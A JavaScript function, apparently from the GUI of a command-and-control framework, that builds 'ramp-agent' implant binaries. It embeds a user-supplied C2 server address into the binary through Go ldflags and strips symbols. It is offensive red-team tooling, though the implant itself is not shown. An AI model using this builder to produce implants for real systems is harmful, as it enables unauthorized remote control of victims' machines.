//============================================================================
// Payload Generator
//============================================================================

async function buildAgent() {
    const platform = document.getElementById('build-platform').value;
    const c2Address = document.getElementById('c2-address').value;
    let outputFilename = document.getElementById('output-filename').value;

    // Validate inputs
    if (!c2Address) {
        showNotification('Error', 'C2 Server address is required');
        return;
    }

    const buildLog = document.getElementById('build-log');
    const buildStatus = document.getElementById('build-status');

    buildLog.textContent = '[*] Starting build process...\n';
    buildStatus.className = 'build-status building';
    buildStatus.textContent = '⏳ Building...';

    try {
        const { spawn } = require('child_process');
        const path = require('path');
        const fs = require('fs');

        // Determine project root (assuming GUI is in gui-controller/)
        const projectRoot = path.join(__dirname, '../..');
        const distDir = path.join(projectRoot, 'dist');

        // Ensure dist directory exists
        if (!fs.existsSync(distDir)) {
            fs.mkdirSync(distDir, { recursive: true });
        }

        // Generate default filename if not provided
        if (!outputFilename) {
            const ext = platform === 'windows' ? '.exe' : '';
            outputFilename = `ramp-agent-${platform}-amd64${ext}`;
        }

        // Check if file exists and auto-increment
        const outputPath = path.join(distDir, outputFilename);
        let finalOutputPath = outputPath;
        let version = 1;

        while (fs.existsSync(finalOutputPath)) {
            const ext = path.extname(outputFilename);
            const base = path.basename(outputFilename, ext);
            finalOutputPath = path.join(distDir, `${base}_v${version}${ext}`);
            version++;
        }

        buildLog.textContent += `[*] Platform: ${platform}\n`;
        buildLog.textContent += `[*] C2 Server: ${c2Address}\n`;
        buildLog.textContent += `[*] Output: ${path.basename(finalOutputPath)}\n\n`;

        // Build command
        // Build command
        const agentDir = path.join(projectRoot, 'agent');
        let buildCmd = 'go';

        // Clean C2 address (remove protocol if present)
        let cleanC2Address = c2Address.replace(/^https?:\/\//, '');

        // Embed C2 address into binary using ldflags
        let buildArgs = [
            'build',
            '-ldflags',
            `-s -w -X "main.embeddedC2Server=${cleanC2Address}"`,
            '-o',
            finalOutputPath
        ];

        // Set environment variables for build
        const env = { ...process.env };
        env.GOOS = platform;
        env.GOARCH = 'amd64';
        env.CGO_ENABLED = '0';

        buildLog.textContent += '[*] Running go build...\n';

        const buildProcess = spawn(buildCmd, buildArgs, {
            cwd: agentDir,
            env: env
        });

        buildProcess.stdout.on('data', (data) => {
            buildLog.textContent += data.toString();
            buildLog.scrollTop = buildLog.scrollHeight;
        });

        buildProcess.stderr.on('data', (data) => {
            buildLog.textContent += data.toString();
            buildLog.scrollHeight = buildLog.scrollHeight;
        });

        buildProcess.on('close', (code) => {
            if (code === 0) {
                buildLog.textContent += `\n[+] Build successful!\n`;
                buildLog.textContent += `[+] Agent saved to: ${finalOutputPath}\n`;
                buildLog.textContent += `[+] File size: ${fs.statSync(finalOutputPath).size} bytes\n`;

                buildStatus.className = 'build-status success';
                buildStatus.textContent = '✅ Build Successful!';

                showNotification('Build Complete', `Agent built: ${path.basename(finalOutputPath)}`);
                logActivity(`Built agent: ${path.basename(finalOutputPath)}`);
            } else {
                buildLog.textContent += `\n[!] Build failed with exit code ${code}\n`;
                buildStatus.className = 'build-status error';
                buildStatus.textContent = '❌ Build Failed';

                showNotification('Build Failed', 'Check build log for details');
                logActivity(' build failed', 'error');
            }
        });

    } catch (error) {
        buildLog.textContent += `\n[!] Error: ${error.message}\n`;
        buildStatus.className = 'build-status error';
        buildStatus.textContent = '❌ Build Error';
        showNotification('Build Error', error.message);
    }
}
